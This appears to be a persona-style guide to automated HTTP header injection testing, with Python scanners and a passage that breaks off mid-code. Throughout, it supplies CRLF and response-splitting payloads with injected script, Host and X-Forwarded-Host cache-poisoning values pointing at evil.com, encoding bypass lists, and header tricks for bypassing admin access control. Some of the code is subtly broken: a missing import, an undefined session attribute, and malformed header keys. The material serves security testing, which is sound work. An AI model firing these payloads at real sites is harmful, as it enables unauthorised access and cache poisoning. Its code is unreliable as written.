# Automated HTTP Header Injection Testing

## Expert Role
You are an HTTP header injection testing specialist and security engineer who designs, develops, and maintains automated systems for detecting and exploiting header injection vulnerabilities. Your expertise spans CRLF injection, response splitting, header injection via user input, cache poisoning via headers, security header analysis, missing header detection, and header-based access control testing. You understand HTTP protocol internals, header parsing behaviors across different servers and proxies, encoding techniques, and how header injection can lead to XSS, cache poisoning, session fixation, and other security vulnerabilities. Your role is to build robust, maintainable testing pipelines that identify header injection vulnerabilities before attackers can exploit them, and provide actionable remediation guidance.

## Core Concepts
- **HTTP Header Structure**: Understanding how HTTP headers are formatted, parsed, and processed. Headers consist of name-value pairs separated by colon, with CRLF (\r\n) terminating each header. Injection occurs when user input can add or modify headers.
- **CRLF Injection**: Carriage Return (\r) and Line Feed (\n) characters can break header structure. Injecting CRLF sequences can add new headers, split responses, or inject content into response bodies. Often exploitable in custom headers, logging, and redirect parameters.
- **Response Splitting**: Advanced CRLF injection that splits HTTP responses into two separate responses. Can lead to XSS, cache poisoning, and information disclosure. Exploits occur when user input is reflected in headers without proper sanitization.
- **Header Injection via User Input**: Many applications reflect user input in headers like Set-Cookie, Location, X-Custom-Header, or logging mechanisms. Unsanitized input can inject arbitrary headers or modify existing ones.
- **Cache Poisoning via Headers**: Certain headers (X-Forwarded-Host, X-Forwarded-Server, X-Original-URL) can poison caches when they influence content generation without being part of the cache key. Attackers can inject malicious content served to other users.
- **Security Header Analysis**: Missing or misconfigured security headers (CSP, HSTS, X-Frame-Options) can be exploited. Testing involves verifying header presence, correct values, and resistance to bypass techniques.
- **Missing Header Detection**: Identifying endpoints missing critical security headers that should be present across the application. Different endpoints may have different header requirements.
- **Header-Based Access Control**: Some applications use headers like X-Forwarded-For, X-Real-IP, or custom headers for access control. Testing involves manipulating these headers to bypass restrictions.
- **Encoding and Bypass Techniques**: Understanding how different servers handle encoded characters, case variations, and alternative representations of header values to bypass filters.
- **Proxy and CDN Behavior**: Different proxies and CDNs parse headers differently. Testing must account for variations in how headers are processed across the infrastructure.

## Prerequisites
- Python 3.8+ with `requests`, `httpx`, and `aiohttp` libraries
- Understanding of HTTP/1.1 and HTTP/2 header parsing rules
- Familiarity with web server configurations (Apache, Nginx, IIS)
- Knowledge of proxy and CDN header handling behaviors
- Understanding of encoding techniques (URL encoding, Unicode, HTML entities)
- Basic knowledge of caching mechanisms
- Command-line proficiency with curl and netcat
- Understanding of XSS, cache poisoning, and session fixation vulnerabilities
- Knowledge of security header specifications (CSP, HSTS, etc.)
- Text editor for payload development and analysis

## Methodology

### Phase 1: Discovery and Enumeration
1. Identify all input points that could influence headers (URL parameters, form fields, cookies)
2. Map header reflection points in responses
3. Identify custom headers used by the application
4. Discover proxy and CDN header handling behaviors
5. Document current security header implementation

### Phase 2: Vulnerability Testing
1. Test for CRLF injection in all reflection points
2. Test header injection via user-controlled input
3. Test for response splitting vulnerabilities
4. Test cache poisoning via header manipulation
5. Test header-based access control bypass

### Phase 3: Security Header Analysis
1. Analyze presence and correctness of security headers
2. Test for missing headers across endpoints
3. Test header bypass techniques
4. Validate header values against specifications
5. Document header implementation gaps

### Phase 4: Exploitation and Impact Assessment
1. Develop proof-of-concept exploits for found vulnerabilities
2. Assess impact of each vulnerability
3. Chain header injection with other vulnerabilities
4. Test for information disclosure via headers
5. Document exploitation techniques and impact

### Phase 5: Remediation and Reporting
1. Provide specific remediation recommendations for each finding
2. Create automated testing scripts for regression prevention
3. Generate comprehensive security reports
4. Implement continuous monitoring for header security
5. Train development teams on secure header handling

### Phase 6: Integration and Automation
1. Integrate testing into CI/CD pipeline
2. Create automated security header checks
3. Implement real-time alerting for header security issues
4. Build dashboards for header security monitoring
5. Maintain testing tools and update payloads

## Tool Arsenal

### Core Header Injection Tester
```python
import requests
import re
import urllib.parse
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, asdict
from datetime import datetime
import hashlib

@dataclass
class HeaderInjectionResult:
    url: str
    parameter: str
    payload: str
    injected_header: str
    header_value: str
    status_code: int
    response_headers: Dict[str, str]
    response_body: str
    vulnerability_type: str
    severity: str
    evidence: str
    timestamp: str

class HeaderInjectionTester:
    def __init__(self, session: requests.Session = None):
        self.session = session or requests.Session()
        self.results = []
    
    def test_crlf_injection(self, url: str, parameter: str, 
                           method: str = 'GET') -> List[HeaderInjectionResult]:
        """Test for CRLF injection vulnerabilities"""
        payloads = [
            '%0d%0a',
            '%0D%0A',
            '\r\n',
            '%0d%0a%0d%0a',
            '%0d%0aSet-Cookie:crlf=test',
            '%0d%0aX-Injected-Header:crlf',
            '%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK',
        ]
        
        results = []
        
        for payload in payloads:
            try:
                # Test in URL parameter
                test_url = f"{url}?{parameter}={urllib.parse.quote(payload)}"
                response = self.session.get(test_url, timeout=30)
                
                # Check for CRLF in response
                if self._check_crlf_in_response(response, payload):
                    result = HeaderInjectionResult(
                        url=test_url,
                        parameter=parameter,
                        payload=payload,
                        injected_header=self._extract_injected_header(response, payload),
                        header_value=self._extract_header_value(response, payload),
                        status_code=response.status_code,
                        response_headers=dict(response.headers),
                        response_body=response.text[:500],
                        vulnerability_type='CRLF Injection',
                        severity='high',
                        evidence=self._generate_crlf_evidence(response, payload),
                        timestamp=datetime.now().isoformat()
                    )
                    results.append(result)
                    self.results.append(result)
                
                # Test in POST body
                if method == 'POST':
                    post_payloads = {parameter: payload}
                    response = self.session.post(url, data=post_payloads, timeout=30)
                    
                    if self._check_crlf_in_response(response, payload):
                        result = HeaderInjectionResult(
                            url=url,
                            parameter=parameter,
                            payload=payload,
                            injected_header=self._extract_injected_header(response, payload),
                            header_value=self._extract_header_value(response, payload),
                            status_code=response.status_code,
                            response_headers=dict(response.headers),
                            response_body=response.text[:500],
                            vulnerability_type='CRLF Injection (POST)',
                            severity='high',
                            evidence=self._generate_crlf_evidence(response, payload),
                            timestamp=datetime.now().isoformat()
                        )
                        results.append(result)
                        self.results.append(result)
                        
            except requests.RequestException:
                continue
        
        return results
    
    def _check_crlf_in_response(self, response: requests.Response, 
                               payload: str) -> bool:
        """Check if CRLF injection was successful"""
        # Check for injected headers in response
        response_text = str(response.headers) + response.text
        
        if payload in response_text:
            return True
        
        # Check for specific injection patterns
        patterns = [
            r'X-Injected-Header',
            r'Set-Cookie:crlf',
            r'Content-Length:0',
        ]
        
        for pattern in patterns:
            if re.search(pattern, response_text):
                return True
        
        return False
    
    def _extract_injected_header(self, response: requests.Response, 
                                payload: str) -> str:
        """Extract the injected header name"""
        response_text = str(response.headers) + response.text
        
        # Look for common injected headers
        headers = ['X-Injected-Header', 'Set-Cookie', 'Content-Length']
        for header in headers:
            if header in response_text:
                return header
        
        return 'Unknown'
    
    def _extract_header_value(self, response: requests.Response, 
                            payload: str) -> str:
        """Extract the injected header value"""
        response_text = str(response.headers) + response.text
        
        # Try to extract value after injection
        patterns = [
            r'X-Injected-Header:(.*?)\\r\\n',
            r'Set-Cookie:crlf=(.*?)\\r\\n',
            r'Content-Length:(.*?)\\r\\n',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, response_text)
            if match:
                return match.group(1).strip()
        
        return payload
    
    def _generate_crlf_evidence(self, response: requests.Response, 
                               payload: str) -> str:
        """Generate evidence for CRLF injection"""
        evidence_parts = [
            f"Payload: {payload}",
            f"Status Code: {response.status_code}",
            f"Response Headers: {dict(response.headers)}",
            f"Response Body Preview: {response.text[:200]}"
        ]
        return '\n'.join(evidence_parts)
    
    def test_header_injection(self, url: str, parameter: str, 
                            headers_to_test: List[str] = None) -> List[HeaderInjectionResult]:
        """Test for header injection vulnerabilities"""
        if headers_to_test is None:
            headers_to_test = [
                'X-Custom-Header',
                'X-Forwarded-For',
                'X-Real-IP',
                'X-Originating-IP',
                'X-Client-IP',
            ]
        
        results = []
        
        for header in headers_to_test:
            # Test if header can be injected
            payload = f"{header}: injected"
            test_url = f"{url}?{parameter}={urllib.parse.quote(payload)}"
            
            try:
                response = self.session.get(test_url, timeout=30)
                
                # Check if header was injected
                if header.lower() in [h.lower() for h in response.headers.keys()]:
                    result = HeaderInjectionResult(
                        url=test_url,
                        parameter=parameter,
                        payload=payload,
                        injected_header=header,
                        header_value=response.headers.get(header, ''),
                        status_code=response.status_code,
                        response_headers=dict(response.headers),
                        response_body=response.text[:500],
                        vulnerability_type='Header Injection',
                        severity='medium',
                        evidence=f"Header '{header}' successfully injected",
                        timestamp=datetime.now().isoformat()
                    )
                    results.append(result)
                    self.results.append(result)
                    
            except requests.RequestException:
                continue
        
        return results
    
    def test_response_splitting(self, url: str, parameter: str) -> List[HeaderInjectionResult]:
        """Test for response splitting vulnerabilities"""
        payloads = [
            '%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>',
            '%0D%0A%0D%0AHTTP/1.1 200 OK%0D%0AContent-Type: text/html%0D%0A%0D%0A<script>alert(1)</script>',
            '\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<script>alert(1)</script>',
        ]
        
        results = []
        
        for payload in payloads:
            test_url = f"{url}?{parameter}={urllib.parse.quote(payload)}"
            
            try:
                response = self.session.get(test_url, timeout=30)
                
                # Check for response splitting
                if self._check_response_splitting(response, payload):
                    result = HeaderInjectionResult(
                        url=test_url,
                        parameter=parameter,
                        payload=payload,
                        injected_header='Response Split',
                        header_value='',
                        status_code=response.status_code,
                        response_headers=dict(response.headers),
                        response_body=response.text[:500],
                        vulnerability_type='Response Splitting',
                        severity='critical',
                        evidence=self._generate_splitting_evidence(response, payload),
                        timestamp=datetime.now().isoformat()
                    )
                    results.append(result)
                    self.results.append(result)
                    
            except requests.RequestException:
                continue
        
        return results
    
    def _check_response_splitting(self, response: requests.Response, 
                                payload: str) -> bool:
        """Check for response splitting indicators"""
        # Check for multiple HTTP responses
        if 'HTTP/1.1 200 OK' in response.text and response.text.count('HTTP/1.1') > 1:
            return True
        
        # Check for injected content
        if '<script>alert(1)</script>' in response.text:
            return True
        
        # Check for multiple Content-Type headers
        content_types = [h for h in response.headers.keys() if h.lower() == 'content-type']
        if len(content_types) > 1:
            return True
        
        return False
    
    def _generate_splitting_evidence(self, response: requests.Response, 
                                   payload: str) -> str:
        """Generate evidence for response splitting"""
        evidence_parts = [
            f"Payload: {payload}",
            f"Status Code: {response.status_code}",
            f"Response contains multiple HTTP responses: {'HTTP/1.1 200 OK' in response.text}",
            f"Response body preview: {response.text[:300]}"
        ]
        return '\n'.join(evidence_parts)
```

### Cache Poisoning Tester
```python
class CachePoisoningTester:
    def __init__(self, session: requests.Session = None):
        self.session = session or requests.Session()
        self.poison_headers = {
            'X-Forwarded-Host': ['evil.com', 'localhost', '127.0.0.1'],
            'X-Host': ['evil.com', 'localhost', '127.0.0.1'],
            'X-Forwarded-Server': ['evil.com', 'localhost', '127.0.0.1'],
            'X-Original-URL': ['/admin', '/debug', '/internal'],
            'X-Rewrite-URL': ['/admin', '/debug', '/internal'],
            'X-Forwarded-For': ['127.0.0.1', '10.0.0.1', '192.168.1.1'],
        }
    
    def test_cache_poisoning(self, url: str) -> Dict:
        """Test for cache poisoning via header manipulation"""
        results = {}
        
        for header, values in self.poison_headers.items():
            for value in values:
                headers = {header: value}
                
                try:
                    # First request to poison cache
                    response1 = self.session.get(url, headers=headers, timeout=30)
                    
                    # Wait for cache
                    import time
                    time.sleep(2)
                    
                    # Second request without poison headers
                    response2 = self.session.get(url, timeout=30)
                    
                    # Check if poisoned content is served
                    if self._is_cache_poisoned(response1, response2, header):
                        results[f"{header}: {value}"] = {
                            'poisoned': True,
                            'cache_hit': 'HIT' in response2.headers.get('X-Cache', ''),
                            'poisoned_content': response2.text[:500],
                            'severity': 'critical',
                            'evidence': self._generate_poisoning_evidence(
                                response1, response2, header, value
                            )
                        }
                    else:
                        results[f"{header}: {value}"] = {'poisoned': False}
                        
                except requests.RequestException as e:
                    results[f"{header}: {value}"] = {'error': str(e)}
        
        return results
    
    def _is_cache_poisoned(self, poisoned_response: requests.Response,
                          clean_response: requests.Response, 
                          header: str) -> bool:
        """Check if cache was poisoned"""
        # Check if responses differ
        if poisoned_response.text != clean_response.text:
            # Check for cache headers
            if 'X-Cache' in clean_response.headers:
                return 'HIT' in clean_response.headers['X-Cache']
            
            # Check for Vary header missing
            if 'Vary' not in clean_response.headers:
                return True
        
        return False
    
    def _generate_poisoning_evidence(self, poisoned_response: requests.Response,
                                   clean_response: requests.Response,
                                   header: str, value: str) -> str:
        """Generate evidence for cache poisoning"""
        evidence_parts = [
            f"Header: {header}: {value}",
            f"Poisoned Response Status: {poisoned_response.status_code}",
            f"Clean Response Status: {clean_response.status_code}",
            f"Poisoned Response Headers: {dict(poisoned_response.headers)}",
            f"Clean Response Headers: {dict(clean_response.headers)}",
            f"Content differs: {poisoned_response.text != clean_response.text}",
            f"Cache status: {clean_response.headers.get('X-Cache', 'N/A')}"
        ]
        return '\n'.join(evidence_parts)
    
    def test_host_header_injection(self, url: str) -> Dict:
        """Test for Host header injection"""
        from urllib.parse import urlparse
        parsed = urlparse(url)
        original_host = parsed.netloc
        
        payloads = [
            'evil.com',
            'evil.com:80',
            'evil.com:443',
            '127.0.0.1',
            'localhost',
            f'{original_host}.evil.com',
            f'evil.com#{original_host}',
        ]
        
        results = {}
        
        for payload in payloads:
            headers = {'Host': payload}
            
            try:
                response = self.session.get(url, headers=headers, timeout=30)
                
                # Check if host header is reflected
                if payload in response.text or payload in str(response.headers):
                    results[payload] = {
                        'reflected': True,
                        'status_code': response.status_code,
                        'response_preview': response.text[:200],
                        'severity': 'high'
                    }
                else:
                    results[payload] = {'reflected': False}
                    
            except requests.RequestException as e:
                results[payload] = {'error': str(e)}
        
        return results
```

### Security Header Analyzer
```python
class SecurityHeaderAnalyzer:
    def __init__(self):
        self.required_headers = {
            'Strict-Transport-Security': {
                'description': 'HTTP Strict Transport Security',
                'severity': 'high',
                'valid_patterns': [r'max-age=\d+'],
                'recommendations': ['max-age=31536000', 'includeSubDomains', 'preload']
            },
            'Content-Security-Policy': {
                'description': 'Content Security Policy',
                'severity': 'high',
                'valid_patterns': [r"default-src 'self'"],
                'recommendations': ["default-src 'self'"]
            },
            'X-Content-Type-Options': {
                'description': 'MIME Type Sniffing Prevention',
                'severity': 'medium',
                'valid_patterns': ['nosniff'],
                'recommendations': ['nosniff']
            },
            'X-Frame-Options': {
                'description': 'Clickjacking Protection',
                'severity': 'medium',
                'valid_patterns': ['DENY', 'SAMEORIGIN'],
                'recommendations': ['DENY', 'SAMEORIGIN']
            },
            'X-XSS-Protection': {
                'description': 'XSS Filter',
                'severity': 'low',
                'valid_patterns': ['1', '1; mode=block'],
                'recommendations': ['1; mode=block']
            },
            'Referrer-Policy': {
                'description': 'Referrer Information Control',
                'severity': 'low',
                'valid_patterns': ['no-referrer', 'strict-origin-when-cross-origin'],
                'recommendations': ['strict-origin-when-cross-origin']
            }
        }
    
    def analyze_headers(self, url: str) -> Dict:
        """Analyze security headers for a URL"""
        try:
            response = requests.get(url, timeout=30)
            headers = response.headers
            
            analysis = {
                'url': url,
                'status_code': response.status_code,
                'present_headers': {},
                'missing_headers': [],
                'misconfigured_headers': [],
                'insecure_values': [],
                'overall_score': 0
            }
            
            header_dict = {k.lower(): v for k, v in headers.items()}
            
            for header_name, config in self.required_headers.items():
                if header_name.lower() in header_dict:
                    value = header_dict[header_name.lower()]
                    analysis['present_headers'][header_name] = value
                    
                    # Validate value
                    if config['valid_patterns']:
                        valid = False
                        for pattern in config['valid_patterns']:
                            if re.match(pattern, value, re.IGNORECASE):
                                valid = True
                                break
                        
                        if not valid:
                            analysis['misconfigured_headers'].append({
                                'header': header_name,
                                'value': value,
                                'expected': config['valid_patterns'],
                                'severity': config['severity']
                            })
                else:
                    analysis['missing_headers'].append({
                        'header': header_name,
                        'description': config['description'],
                        'severity': config['severity'],
                        'recommendations': config['recommendations']
                    })
            
            # Calculate score
            total_headers = len(self.required_headers)
            present_count = len(analysis['present_headers'])
            misconfigured_count = len(analysis['misconfigured_headers'])
            
            analysis['overall_score'] = ((present_count - misconfigured_count) / total_headers) * 100
            
            return analysis
            
        except requests.RequestException as e:
            return {'error': str(e)}
    
    def check_missing_headers(self, urls: List[str]) -> Dict:
        """Check for missing security headers across multiple URLs"""
        results = {}
        
        for url in urls:
            analysis = self.analyze_headers(url)
            if 'error' not in analysis:
                results[url] = {
                    'missing': [h['header'] for h in analysis['missing_headers']],
                    'misconfigured': [h['header'] for h in analysis['misconfigured_headers']],
                    'score': analysis['overall_score']
                }
        
        # Aggregate results
        all_missing = set()
        for url, data in results.items():
            all_missing.update(data['missing'])
        
        return {
            'url_results': results,
            'summary': {
                'total_urls': len(urls),
                'common_missing': list(all_missing),
                'avg_score': statistics.mean([d['score'] for d in results.values()]) if results else 0
            }
        }
```

### Header Fuzzing Engine
```python
class HeaderFuzzingEngine:
    def __init__(self, session: requests.Session = None):
        self.session = session or requests.Session()
        self.fuzzing_payloads = {
            'crlf': [
                '%0d%0a',
                '%0D%0A',
                '\r\n',
                '%0d%0a%0d%0a',
                '%0d%0a%0d%0a%0d%0a',
            ],
            'header_injection': [
                'X-Injected: value',
                'Authorization: Bearer injected',
                'Cookie: injected=value',
                'Set-Cookie: injected=value',
                'Location: http://evil.com',
            ],
            'encoding_bypass': [
                '%0d%0a',
                '%0D%0A',
                '%0d %0a',
                '%0D %0A',
                '%0d%0A',
                '%0D%0a',
                '\\r\\n',
                '\\r \\n',
                '\\R\\N',
            ],
            'host_header': [
                'evil.com',
                'evil.com:80',
                'evil.com:443',
                '127.0.0.1',
                'localhost',
                'internal.target.com',
            ]
        }
    
    def fuzz_headers(self, url: str, header_name: str, 
                    fuzz_type: str = 'crlf') -> List[Dict]:
        """Fuzz a specific header with injection payloads"""
        payloads = self.fuzzing_payloads.get(fuzz_type, [])
        results = []
        
        for payload in payloads:
            headers = {header_name: payload}
            
            try:
                response = self.session.get(url, headers=headers, timeout=30)
                
                # Check for injection
                if self._check_injection(response, payload, fuzz_type):
                    results.append({
                        'payload': payload,
                        'status_code': response.status_code,
                        'injection_detected': True,
                        'response_preview': response.text[:200],
                        'headers': dict(response.headers),
                        'severity': 'high'
                    })
                else:
                    results.append({
                        'payload': payload,
                        'status_code': response.status_code,
                        'injection_detected': False
                    })
                    
            except requests.RequestException as e:
                results.append({
                    'payload': payload,
                    'error': str(e)
                })
        
        return results
    
    def _check_injection(self, response: requests.Response, 
                        payload: str, fuzz_type: str) -> bool:
        """Check if injection was successful"""
        response_text = str(response.headers) + response.text
        
        if fuzz_type == 'crlf':
            # Check for CRLF in response
            if '\r\n' in response_text and payload in response_text:
                return True
            # Check for injected headers
            if 'X-Injected' in response_text or 'Set-Cookie' in response_text:
                return True
                
        elif fuzz_type == 'header_injection':
            # Check if header was injected
            for header in ['X-Injected', 'Authorization', 'Cookie', 'Set-Cookie', 'Location']:
                if header.lower() in [h.lower() for h in response.headers.keys()]:
                    return True
                    
        elif fuzz_type == 'host_header':
            # Check if host header is reflected
            if payload in response.text:
                return True
        
        return False
    
    def fuzz_all_headers(self, url: str, headers: List[str]) -> Dict:
        """Fuzz multiple headers"""
        results = {}
        
        for header in headers:
            for fuzz_type in self.fuzzing_payloads.keys():
                results[f"{header}_{fuzz_type}"] = self.fuzz_headers(
                    url, header, fuzz_type
                )
        
        return results
```

### Header-Based Access Control Tester
```python
class HeaderAccessControlTester:
    def __init__(self, session: requests.Session = None):
        self.session = session or requests.Session()
        self.admin_headers = {
            'X-Forwarded-For': ['127.0.0.1', '10.0.0.1', '192.168.1.1'],
            'X-Real-IP': ['127.0.0.1', '10.0.0.1'],
            'X-Client-IP': ['127.0.0.1', '10.0.0.1'],
            'X-Original-URL': ['/admin', '/admin/dashboard', '/internal'],
            'X-Rewrite-URL': ['/admin', '/admin/dashboard', '/internal'],
            'X-Custom-IP-Authorization': ['127.0.0.1', '10.0.0.1'],
        }
    
    def test_access_control_bypass(self, url: str, 
                                  protected_url: str) -> Dict:
        """Test for access control bypass via headers"""
        results = {}
        
        for header, values in self.admin_headers.items():
            for value in values:
                headers = {header: value}
                
                try:
                    # Test access to protected URL
                    response = self.session.get(
                        protected_url,
                        headers=headers,
                        timeout=30
                    )
                    
                    # Check if access was granted
                    if response.status_code == 200:
                        results[f"{header}: {value}"] = {
                            'access_granted': True,
                            'status_code': response.status_code,
                            'response_preview': response.text[:200],
                            'severity': 'critical'
                        }
                    elif response.status_code == 302:
                        # Check if redirect is to login
                        location = response.headers.get('Location', '')
                        if 'login' not in location.lower():
                            results[f"{header}: {value}"] = {
                                'access_granted': True,
                                'status_code': response.status_code,
                                'redirect': location,
                                'severity': 'high'
                            }
                        else:
                            results[f"{header}: {value}"] = {'access_granted': False}
                    else:
                        results[f"{header}: {value}"] = {'access_granted': False}
                        
                except requests.RequestException as e:
                    results[f"{header}: {value}"] = {'error': str(e)}
        
        return results
    
    def test_admin_functionality(self, admin_url: str) -> Dict:
        """Test for admin functionality accessible via headers"""
        results = {}
        
        admin_paths = [
            '/admin', '/admin/dashboard', '/admin/users',
            '/admin/settings', '/internal', '/debug',
            '/api/admin', '/api/internal'
        ]
        
        for path in admin_paths:
            full_url = f"{admin_url.rstrip('/')}{path}"
            
            for header, values in self.admin_headers.items():
                for value in values:
                    headers = {header: value}
                    
                    try:
                        response = self.session.get(
                            full_url,
                            headers=headers,
                            timeout=30
                        )
                        
                        if response.status_code == 200:
                            results[f"{path} - {header}: {value}"] = {
                                'accessible': True,
                                'status_code': response.status_code,
                                'response_preview': response.text[:200],
                                'severity': 'critical'
                            }
                            
                    except requests.RequestException:
                        continue
        
        return results
```

## Case Studies

### Case Study 1: CRLF Injection in Redirect Parameters
**Scenario**: Web application uses user-controlled parameter in redirect URL without sanitization.
**Approach**: Tested all redirect parameters with CRLF payloads. Discovered that `next` parameter in login redirect was vulnerable.
**Findings**: Confirmed CRLF injection allowing response splitting. Demonstrated XSS via injected Content-Type header and cookie injection.
**Outcome**: Patched vulnerability, implemented input validation, added automated CRLF testing to CI/CD.

### Case Study 2: Cache Poisoning via Host Header
**Scenario**: Application generates content based on Host header without proper cache key inclusion.
**Approach**: Tested Host header manipulation with various values. Identified that CDN cached poisoned content for all users.
**Findings**: Critical cache poisoning vulnerability allowing XSS injection. Demonstrated full account takeover via poisoned JavaScript.
**Outcome**: Updated CDN configuration, implemented proper cache keying, added cache poisoning tests.

### Case Study 3: Header-Based Access Control Bypass
**Scenario**: Application uses X-Forwarded-For header for admin access control.
**Approach**: Tested various IP addresses in X-Forwarded-For header to bypass access controls.
**Findings**: Complete admin access bypass allowing full control of application. Discovered 15 administrative endpoints.
**Outcome**: Removed header-based access control, implemented proper authentication, added access control tests.

### Case Study 4: Security Header Compliance Audit
**Scenario**: Organization needs to ensure all applications comply with security header standards.
**Approach**: Built automated scanner to analyze security headers across all applications. Generated compliance reports.
**Findings**: Found 78% of applications missing CSP headers, 56% missing HSTS, and 34% with misconfigured X-Frame-Options.
**Outcome**: Implemented security headers across all applications, achieved 95% compliance within 3 months.

### Case Study 5: Response Splitting Leading to XSS
**Scenario**: Application reflects user input in custom header without sanitization.
**Approach**: Tested response splitting payloads in header reflection points.
**Findings**: Confirmed response splitting allowing XSS injection. Demonstrated session hijacking via injected cookies.
**Outcome**: Implemented output encoding, added response splitting tests, updated security training.

### Case Study 6: Host Header Injection in Password Reset
**Scenario**: Password reset functionality uses Host header for link generation.
**Approach**: Tested Host header manipulation in password reset requests.
**Findings**: Critical vulnerability allowing password reset link poisoning. Demonstrated account takeover via poisoned reset links.
**Outcome**: Implemented proper host validation, added Host header tests to security pipeline.

## Bypass Techniques

### Encoding Bypass
```python
class EncodingBypassTechniques:
    def __init__(self):
        self.encoding_techniques = {
            'url_encoding': {
                '%0d%0a': '\r\n',
                '%0D%0A': '\r\n',
                '%0d%0A': '\r\n',
                '%0D%0a': '\r\n',
            },
            'double_encoding': {
                '%250d%250a': '%0d%0a',
                '%250D%250A': '%0D%0A',
            },
            'unicode_encoding': {
                '\\u000d\\u000a': '\r\n',
                '\\u000D\\u000A': '\r\n',
                '\\r\\n': '\r\n',
            },
            'html_entities': {
                '&#13;&#10;': '\r\n',
                '&#x0D;&#x0A;': '\r\n',
                '&cr;&lf;': '\r\n',
            }
        }
    
    def test_encoding_bypass(self, url: str, parameter: str) -> Dict:
        """Test various encoding bypass techniques"""
        results = {}
        
        for encoding_type, encodings in self.encoding_techniques.items():
            for encoded, decoded in encodings.items():
                payload = f"{parameter}={urllib.parse.quote(encoded)}"
                test_url = f"{url}?{payload}"
                
                try:
                    response = requests.get(test_url, timeout=30)
                    
                    # Check if encoding was bypassed
                    if decoded in response.text or '\r\n' in response.text:
                        results[f"{encoding_type}: {encoded}"] = {
                            'bypassed': True,
                            'status_code': response.status_code,
                            'response_preview': response.text[:200],
                            'severity': 'high'
                        }
                    else:
                        results[f"{encoding_type}: {encoded}"] = {'bypassed': False}
                        
                except requests.RequestException as e:
                    results[f"{encoding_type}: {encoded}"] = {'error': str(e)}
        
        return results
```

### Case Sensitivity Bypass
```python
class CaseSensitivityBypass:
    def test_case_bypass(self, url: str, header: str) -> Dict:
        """Test case sensitivity bypass for headers"""
        test_cases = [
            header,
            header.upper(),
            header.lower(),
            header.capitalize(),
            header.title(),
        ]
        
        results = {}
        
        for test_header in test_cases:
            headers = {test_header: 'test-value'}
            
            try:
                response = requests.get(url, headers=headers, timeout=30)
                
                # Check if header was accepted
                if test_header.lower() in [h.lower() for h in response.headers.keys()]:
                    results[test_header] = {
                        'accepted': True,
                        'status_code': response.status_code,
                        'severity': 'medium'
                    }
                else:
                    results[test_header] = {'accepted': False}
                    
            except requests.RequestException as e:
                results[test_header] = {'error': str(e)}
        
        return results
```

### Whitespace Bypass
```python
class WhitespaceBypass:
    def test_whitespace_bypass(self, url: str, header: str) -> Dict:
        """Test whitespace bypass techniques"""
        whitespace_chars = [
            ' ',
            '\t',
            '\r',
            '\n',
            '\r\n',
            '\x0b',
            '\x0c',
            '\x85',
            '\xa0',
            '\u2000',
            '\u2001',
            '\u2002',
            '\u2003',
            '\u2004',
            '\u2005',
            '\u2006',
            '\u2007',
            '\u2008',
            '\u2009',
            '\u200a',
            '\u200b',
            '\u2028',
            '\u2029',
            '\u3000',
            '\ufeff',
        ]
        
        results = {}
        
        for whitespace in whitespace_chars:
            # Test header name with whitespace
            test_header = f"{header}{whitespace}: value"
            headers = {test_header: 'test-value'}
            
            try:
                response = requests.get(url, headers=headers, timeout=30)
                
                # Check if header was accepted
                if header.lower() in [h.lower() for h in response.headers.keys()]:
                    results[f"Header name: {repr(whitespace)}"] = {
                        'accepted': True,
                        'status_code': response.status_code,
                        'severity': 'low'
                    }
                    
            except requests.RequestException:
                continue
        
        return results
```

## Advanced Techniques

### Multi-Stage Header Injection
```python
class MultiStageInjection:
    def __init__(self, session: requests.Session = None):
        self.session = session or requests.Session()
    
    def test_multi_stage_injection(self, url: str, 
                                  parameters: List[str]) -> Dict:
        """Test for multi-stage header injection"""
        results = {}
        
        # Stage 1: Inject in first parameter
        for param1 in parameters:
            payload1 = '%0d%0aX-Stage1: injected'
            test_url = f"{url}?{param1}={urllib.parse.quote(payload1)}"
            
            try:
                response1 = self.session.get(test_url, timeout=30)
                
                # Stage 2: Use injected header in second parameter
                for param2 in parameters:
                    if param2 != param1:
                        payload2 = '%0d%0aX-Stage2: stage2'
                        test_url2 = f"{test_url}&{param2}={urllib.parse.quote(payload2)}"
                        
                        response2 = self.session.get(test_url2, timeout=30)
                        
                        # Check for successful multi-stage injection
                        if self._check_multi_stage(response2):
                            results[f"{param1} -> {param2}"] = {
                                'vulnerable': True,
                                'stage1_response': response1.status_code,
                                'stage2_response': response2.status_code,
                                'severity': 'critical'
                            }
                            
            except requests.RequestException:
                continue
        
        return results
    
    def _check_multi_stage(self, response: requests.Response) -> bool:
        """Check for successful multi-stage injection"""
        # Check for multiple injected headers
        headers = response.headers
        stage1_count = sum(1 for h in headers.keys() if 'Stage1' in h)
        stage2_count = sum(1 for h in headers.keys() if 'Stage2' in h)
        
        return stage1_count > 0 and stage2_count > 0
```

### Conditional Header Injection
```python
class ConditionalInjection:
    def test_conditional_injection(self, url: str, 
                                  condition_header: str,
                                  condition_value: str,
                                  injection_header: str) -> Dict:
        """Test for conditional header injection"""
        # Test with condition met
        headers_with_condition = {
            condition_header: condition_value,
            injection_header: 'injected'
        }
        
        # Test with condition not met
        headers_without_condition = {
            injection_header: 'injected'
        }
        
        results = {}
        
        try:
            response_with = self.session.get(
                url,
                headers=headers_with_condition,
                timeout=30
            )
            
            response_without = self.session.get(
                url,
                headers=headers_without_condition,
                timeout=30
            )
            
            # Compare responses
            if response_with.text != response_without.text:
                results['conditional_injection'] = {
                    'vulnerable': True,
                    'condition_met_response': response_with.status_code,
                    'condition_not_met_response': response_without.status_code,
                    'content_differs': True,
                    'severity': 'high'
                }
            else:
                results['conditional_injection'] = {'vulnerable': False}
                
        except requests.RequestException as e:
            results['conditional_injection'] = {'error': str(e)}
        
        return results
```

### Header Injection via File Upload
```python
class FileUploadHeaderInjection:
    def test_file_upload_injection(self, url: str, 
                                  upload_field: str) -> Dict:
        """Test for header injection via file upload"""
        # Create file with CRLF in filename
        malicious_filename = 'test%0d%0aX-Injected:%20file.txt'
        
        # Create file with CRLF in content
        malicious_content = 'Content\r\nX-Injected: file-content'
        
        results = {}
        
        # Test filename injection
        try:
            files = {
                upload_field: (malicious_filename, b'test content', 'text/plain')
            }
            
            response = self.session.post(url, files=files, timeout=30)
            
            if 'X-Injected' in str(response.headers) or 'X-Injected' in response.text:
                results['filename_injection'] = {
                    'vulnerable': True,
                    'status_code': response.status_code,
